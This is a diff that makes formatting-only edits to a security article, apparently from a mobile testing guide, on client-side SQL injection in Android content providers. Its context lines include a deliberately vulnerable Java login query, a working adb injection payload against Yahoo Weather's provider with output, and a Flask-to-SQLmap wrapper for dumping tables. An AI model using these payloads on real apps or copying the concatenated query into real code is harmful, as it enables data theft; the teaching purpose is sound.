@@ -18,7 +18,7 @@ A *SQL injection* attack involves integrating SQL commands into input data, mimi
 
 Apps on both Android and iOS use SQLite databases as a means to control and organize local data storage. Assume an Android app handles local user authentication by storing the user credentials in a local database (a poor programming practice we’ll overlook for the sake of this example). Upon login, the app queries the database to search for a record with the username and password entered by the user:
 
-```java=
+```java
 SQLiteDatabase db;
 
 String sql = "SELECT * FROM users WHERE username = '" +  username + "' AND password = '" + password +"'";
@@ -46,7 +46,7 @@ Because the condition `'1' = '1'` always evaluates as true, this query return al
 
 Ostorlab exploited the sort parameter of Yahoo's weather mobile application with adb using this SQL injection payload.
 
-```
+```shell
 $ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/ --sort '_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master/**/where/**/1=1\)'  
 
 Row: 0 _id=1, woeid=2487956, isCurrentLocation=0, latitude=NULL, longitude=NULL, photoWoeid=NULL, city=NULL, state=NULL, stateAbbr=, country=NULL, countryAbbr=, timeZoneId=NULL, timeZoneAbbr=NULL, lastUpdatedTimeMillis=746034814, crc=1591594725
@@ -58,7 +58,6 @@ The payload can be further simplified using the following `_id/**/limit/**/\(sel
 This SQL injection vulnerability did not expose any sensitive data that the user didn't already have access to. This example presents a way that adb can be used to test vulnerable content providers. Ostorlab takes this even further and creates a webpage instance of the SQLite query, then runs SQLmap to dump the tables.
 
 ```python
-
 import subprocess
 from flask import Flask, request
 
@@ -84,7 +83,6 @@ def hello():
 
 if __name__=="__main__":
    app.run()
-
 ```
 
 One real-world instance of client-side SQL injection was discovered by Mark Woods within the "Qnotes" and "Qget" Android apps running on QNAP NAS storage appliances. These apps exported content providers vulnerable to SQL injection, allowing an attacker to retrieve the credentials for the NAS device. A detailed description of this issue can be found on the [Nettitude Blog](https://blog.nettitude.com/uk/qnap-android-dont-provide "Nettitude Blog - QNAP Android: Don't Over Provide").
